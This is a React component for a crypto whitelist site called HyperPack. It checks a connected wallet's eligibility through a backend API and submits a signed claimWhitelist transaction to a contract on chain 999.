import React, { useState, useEffect } from 'react';
import { useAccount, useWalletClient, usePublicClient } from 'wagmi';
import { usePrivy } from '@privy-io/react-auth';
import { ethers } from 'ethers';
import { Link } from 'react-router-dom';

const API_BASE = import.meta.env.VITE_API_BASE || '';
const CONTRACT_ADDRESS = import.meta.env.VITE_WHITELIST_CLAIM_CONTRACT || '0x1f5b76EAA8e2A2eF854f177411627C9f3b632BC0';

const CONTRACT_ABI = [
  "function claimWhitelist(address user, uint256 amount, uint256 nonce, uint256 deadline, bytes calldata signature) external payable"
];

export default function EligibilityChecker() {
  const { address, isConnected } = useAccount();
  const { login, logout, ready, authenticated } = usePrivy();
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();
  
  const [eligibility, setEligibility] = useState(null);
  const [loading, setLoading] = useState(false);
  const [claiming, setClaiming] = useState(false);
  const [claimed, setClaimed] = useState(false);
  const [error, setError] = useState(null);
  const [hypeBalance, setHypeBalance] = useState('0');

  useEffect(() => {
    if (address) {
      checkEligibility();
      getBalance();
    }
  }, [address]);

  const getBalance = async () => {
    if (!address || !publicClient) return;
    try {
      const balance = await publicClient.getBalance({ address });
      setHypeBalance(ethers.formatEther(balance.toString()));
    } catch (err) {
      console.error('Failed to get balance:', err);
    }
  };

  const checkEligibility = async () => {
    if (!address) return;

    try {
      setLoading(true);
      setError(null);

      const response = await fetch(`${API_BASE}/api/hyperpacks/eligibility?wallet=${address}`);
      const data = await response.json();

      if (response.ok) {
        setEligibility(data);
      } else {
        setError(data.error || 'Failed to check eligibility');
      }
    } catch (err) {
      console.error(err);
      setError('Network error');
    } finally {
      setLoading(false);
    }
  };

  const claimWhitelist = async () => {
    console.log('🔍 claimWhitelist called');
    console.log('📊 State:', { isConnected, address, eligible: eligibility?.eligible, hasWalletClient: !!walletClient });
    
    if (!isConnected || !address || !eligibility?.eligible || !walletClient) {
      const missing = [];
      if (!isConnected) missing.push('not connected');
      if (!address) missing.push('no address');
      if (!eligibility?.eligible) missing.push('not eligible');
      if (!walletClient) missing.push('no walletClient');
      console.error('❌ Cannot claim:', missing.join(', '));
      setError(`Cannot claim: ${missing.join(', ')}`);
      return;
    }

    try {
      setClaiming(true);
      setError(null);
      console.log('✅ Fetching claim signature...');

      const response = await fetch(`${API_BASE}/api/hyperpacks/claim-whitelist`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ wallet: address })
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.error || 'Failed to prepare claim');
      }

      const claimData = await response.json();
      console.log('✅ Got claim data:', claimData);

      console.log('🔄 Switching to HyperEVM chain...');
      await walletClient.switchChain({ id: 999 });

      console.log('📝 Sending transaction...');
      const hash = await walletClient.writeContract({
        address: CONTRACT_ADDRESS,
        abi: CONTRACT_ABI,
        functionName: 'claimWhitelist',
        args: [
          address,
          BigInt(claimData.amount),
          BigInt(claimData.nonce),
          BigInt(claimData.deadline),
          claimData.signature
        ],
        chain: { id: 999 }
      });

      console.log('⏳ Waiting for transaction:', hash);
      await publicClient.waitForTransactionReceipt({ hash });

      console.log('✅ Transaction confirmed!');
      setClaimed(true);
      setTimeout(() => checkEligibility(), 2000);
    } catch (err) {
      console.error('❌ Claim error:', err);
      setError(err.message || 'Failed to claim whitelist');
    } finally {
      setClaiming(false);
    }
  };

  return (
    <div className='app'>
      {/* Navigation - Same as Landing */}
      <nav className='nav'>
        <div className='nav-container'>
          <Link to='/' className='nav-logo'>
            <span className='logo-text brand-gradient-text'>HyperPack</span>
          </Link>
          <div className='nav-links'>
            {isConnected && (
              <span style={{color: '#b3b3b3', fontSize: '14px', fontFamily: 'JetBrains Mono, monospace'}}>
                {address?.slice(0, 6)}...{address?.slice(-4)}
              </span>
            )}
          </div>
        </div>
      </nav>

      {/* Main Content */}
      <section className='hero'>
        <div className='hero-container'>
          <div style={{flex: 1, maxWidth: '800px', margin: '0 auto', width: '100%'}}>
            <h1 className='hero-title' style={{marginBottom: '20px'}}>
              <span className='brand-gradient-text'>Whitelist Eligibility</span>
            </h1>
            <p className='hero-subtitle' style={{marginBottom: '40px'}}>
              Check your eligibility and claim your tokens
            </p>

            {!isConnected ? (
              <div style={{maxWidth: '500px'}}>
                <h2 style={{fontSize: '28px', fontWeight: '600', color: '#b3b3b3', marginBottom: '16px'}}>
                  Connect Your Wallet
                </h2>
                <p style={{color: '#666666', marginBottom: '32px'}}>
                  Please connect your wallet to check airdrop eligibility
                </p>
                <button onClick={login} className='btn-primary' disabled={!ready}>
                  Connect Wallet
                </button>
              </div>
            ) : (
              <div style={{maxWidth: '700px'}}>
                {/* Wallet Info Card */}
                <div style={{
                  background: '#1f1f1f',
                  border: '1px solid #333333',
                  borderRadius: '12px',
                  padding: '24px',
                  marginBottom: '24px'
                }}>
                  <p style={{color: '#666666', fontSize: '12px', marginBottom: '8px', textTransform: 'uppercase', letterSpacing: '0.5px'}}>
                    Connected Wallet
                  </p>
                  <p style={{color: '#ffffff', fontFamily: 'JetBrains Mono, monospace', fontSize: '14px', wordBreak: 'break-all'}}>
                    {address}
                  </p>
                </div>

                {loading && (
                  <div style={{textAlign: 'center', padding: '48px 0'}}>
                    <div style={{
                      width: '48px',
                      height: '48px',
                      border: '4px solid #333333',
                      borderTopColor: '#00ccdd',
                      borderRadius: '50%',
                      margin: '0 auto 16px',
                      animation: 'spin 1s linear infinite'
                    }}></div>
                    <p style={{color: '#666666'}}>Checking eligibility...</p>
                  </div>
                )}

                {error && (
                  <div style={{
                    background: 'rgba(255, 68, 68, 0.1)',
                    border: '1px solid rgba(255, 68, 68, 0.3)',
                    color: '#ff4444',
                    padding: '16px',
                    borderRadius: '12px',
                    marginBottom: '24px'
                  }}>
                    <p>⚠️ {error}</p>
                  </div>
                )}

                {eligibility && !loading && (
                  <div>
                    {eligibility.eligible ? (
                      <div>
                        <div style={{
                          background: 'rgba(0, 255, 136, 0.1)',
                          border: '1px solid rgba(0, 255, 136, 0.3)',
                          borderRadius: '12px',
                          padding: '24px',
                          marginBottom: '24px',
                          textAlign: 'center'
                        }}>
                          <p style={{fontSize: '24px', fontWeight: '700', color: '#00ff88'}}>
                            ✅ You're Eligible!
                          </p>
                        </div>

                        {eligibility.claimed ? (
                          <div style={{
                            background: 'rgba(0, 204, 221, 0.1)',
                            border: '1px solid rgba(0, 204, 221, 0.3)',
                            color: '#00ccdd',
                            padding: '16px',
                            borderRadius: '12px',
                            textAlign: 'center'
                          }}>
                            <p style={{fontSize: '18px', fontWeight: '600'}}>✅ Already Claimed</p>
                            <p style={{fontSize: '14px', color: '#0099cc', marginTop: '4px'}}>
                              Your whitelist has been activated
                            </p>
                          </div>
                        ) : (
                          <button
                            onClick={claimWhitelist}
                            disabled={claiming}
                            className='btn-primary'
                            style={{width: '100%'}}
                          >
                            {claiming ? 'Verifying...' : 'Verify Your Wallet'}
                          </button>
                        )}
                      </div>
                    ) : (
                      <div style={{
                        background: 'rgba(255, 68, 68, 0.1)',
                        border: '1px solid rgba(255, 68, 68, 0.3)',
                        borderRadius: '12px',
                        padding: '24px',
                        textAlign: 'center'
                      }}>
                        <p style={{fontSize: '24px', fontWeight: '700', color: '#ff4444', marginBottom: '8px'}}>
                          ❌ Not Eligible
                        </p>
                        <p style={{fontSize: '14px', color: '#ff6666'}}>
                          This wallet is not on the whitelist
                        </p>
                      </div>
                    )}
                  </div>
                )}

                {claimed && (
                  <div style={{
                    marginTop: '24px',
                    background: 'rgba(0, 255, 136, 0.1)',
                    border: '1px solid rgba(0, 255, 136, 0.3)',
                    color: '#00ff88',
                    padding: '16px',
                    borderRadius: '12px',
                    textAlign: 'center'
                  }}>
                    <p style={{fontWeight: '700'}}>🎉 Whitelist Claimed Successfully!</p>
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      </section>

      {/* Footer - Same as Landing */}
      <footer style={{
        borderTop: '1px solid #333333',
        padding: '40px 24px',
        marginTop: '80px'
      }}>
        <div style={{
          maxWidth: '1200px',
          margin: '0 auto',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          gap: '16px'
        }}>
          <div style={{display: 'flex', gap: '32px'}}>
            <a href='#' style={{color: '#666666', textDecoration: 'none', transition: 'color 0.2s'}} onMouseEnter={e => e.target.style.color = '#ffffff'} onMouseLeave={e => e.target.style.color = '#666666'}>X</a>
            <a href='#' style={{color: '#666666', textDecoration: 'none', transition: 'color 0.2s'}} onMouseEnter={e => e.target.style.color = '#ffffff'} onMouseLeave={e => e.target.style.color = '#666666'}>Telegram</a>
            <a href='#' style={{color: '#666666', textDecoration: 'none', transition: 'color 0.2s'}} onMouseEnter={e => e.target.style.color = '#ffffff'} onMouseLeave={e => e.target.style.color = '#666666'}>Discord</a>
            <a href='#' style={{color: '#666666', textDecoration: 'none', transition: 'color 0.2s'}} onMouseEnter={e => e.target.style.color = '#ffffff'} onMouseLeave={e => e.target.style.color = '#666666'}>Docs</a>
          </div>
          <p style={{color: '#666666', fontSize: '14px'}}>© 2025 HyperPack</p>
        </div>
      </footer>

      <style>{`
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}
